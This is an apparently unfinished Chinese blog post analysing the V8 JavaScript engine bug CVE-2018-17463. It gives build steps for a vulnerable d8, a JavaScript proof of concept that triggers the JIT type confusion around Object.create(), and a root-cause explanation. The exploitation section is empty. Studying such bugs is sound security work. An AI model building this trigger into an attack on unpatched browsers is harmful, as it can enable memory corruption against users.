---
layout:     post
title:      "V8引擎CVE-2018-17463漏洞分析（工事中）"
subtitle:   ""
date:       2019-9-4 22:30:00
author:     "GToad"
header-img: "img/android-five.png"
catalog: true
tags:
    - chrome
    - v8
    - exploit
    - cve
    - browser
---

> 本文为本博客V8系列第四篇。

## 漏洞基本信息

[漏洞信息页面](https://bugs.chromium.org/p/chromium/issues/detail?id=888923)
[漏洞修复代码](https://chromium.googlesource.com/v8/v8.git/+/52a9e67a477bdb67ca893c25c145ef5191976220)

根据漏洞基本信息可准备分析环境，先切换至漏洞修复前版本。
```
git checkout 568979f4d891bafec875fab20f608ff9392f4f29
gclient sync
```

对源码进行编译。
```
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
```

## PoC


```javascript
function check_vul(){
    function bad_create(x){
        x.a;
        Object.create(x);
        return x.b;

    }

    for (let i = 0;i < 10000; i++){
        let x = {a : 0x1234};
        x.b = 0x5678; 
        let res = bad_create(x);
        //log(res);
        if( res != 0x5678){
            console.log(i);
            console.log("CVE-2018-17463 exists in the d8");
            return;
        }

    }
    throw "bad d8 version";

}
check_vul();
```

![](/img/in-post/post-cve20165198/poc-core-dumped.png)

POC代码执行后，res的取值将会发生错误，从而导致输出“CVE-2018-17463 exists in the d8”语句。

## 漏洞成因

漏洞成因是原本分开保存的各个属性在`Object.create()`后会被整理到一个大的hash表结构里。但是JIT后的函数不知道，依旧按照最初保存在变量结构体里的偏移去取，导致下方的内存泄露。

## 漏洞利用









